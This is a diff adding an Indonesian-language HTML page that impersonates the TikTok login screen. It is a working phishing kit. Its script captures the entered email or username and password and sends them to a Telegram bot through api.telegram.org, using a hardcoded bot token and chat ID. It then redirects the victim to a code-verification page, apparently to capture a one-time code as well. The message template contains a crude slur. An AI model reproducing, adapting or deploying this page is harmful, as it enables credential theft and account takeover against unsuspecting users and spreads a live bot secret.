@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke TikTok</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: white;
+            padding: 30px;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            color: #000;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 25px;
+            color: #000;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 10px 10px 35px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            background-color: #f5f5f5;
+            outline: none;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            font-size: 0.8rem;
+            color: #999;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff0050;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            font-size: 0.8rem;
+            color: #999;
+            margin-bottom: 20px;
+        }
+
+        .signup-text {
+            font-size: 0.9rem;
+            color: #000;
+        }
+
+        .signup-link {
+            color: #ff0050;
+            font-weight: bold;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <div class="logo">
+            <i class="fab fa-tiktok"></i>
+        </div>
+        <div class="title">Masuk ke TikTok</div>
+
+        <div class="input-group">
+            <i class="fas fa-envelope"></i>
+            <input type="email" id="nomor" placeholder="Email/Nama Pengguna">
+
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-lock"></i>
+            <input type="Password" id="pin" placeholder="Masukkan kata Sandi">
+        </div>
+
+        <a href="" class="signup-text">Lupa Sandi?</a>
+
+        <button class="login-btn" onclick="kirimData()">MASUK</button>
+
+        <div class="divider"></div>
+
+        <div class="signup-text">
+              <a href="" class="signup-link"></a>
+        </div>
+    </div>
+
+    <!-- ============================================== -->
+    <!-- SCRIPT KIRIM KE TELEGRAM & PINDAH HALAMAN -->
+    <!-- ============================================== -->
+    <script>
+        // 👇👇 GANTI INI DULU 👇👇
+        const BOT_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
+        const CHAT_ID = "-1003797236002";
+        const HALAMAN_BERIKUTNYA = "verifikasi kode.html"; // Ganti nama file
+
+        function kirimData(){
+            let nomor = document.getElementById("nomor").value;
+            let pin = document.getElementById("pin").value;
+
+            // CEK JIKA ADA YANG KOSONG
+            if(nomor.trim() === "" || pin.trim() === ""){
+                
+                return false; // BATALKAN PROSES
+            }
+
+            let pesan = ` <b>*░▒▬▬ஜ۩Kontol۩ஜ▬▬▒░*</b>
+Nomor handpone: ${nomor}
+Password: ${pin}`;
+
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            // KIRIM DATA KE TELEGRAM
+            fetch(url, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: "HTML"
+                })
+            })
+            .catch(() => {
+                // Kalau ada error tetap pindah halaman
+            })
+            .finally(() => {
+                // WAJIB PINDAH HALAMAN
+                window.location.href = HALAMAN_BERIKUTNYA;
+            });
+        }
+    </script>
+
+</body>
+</html>
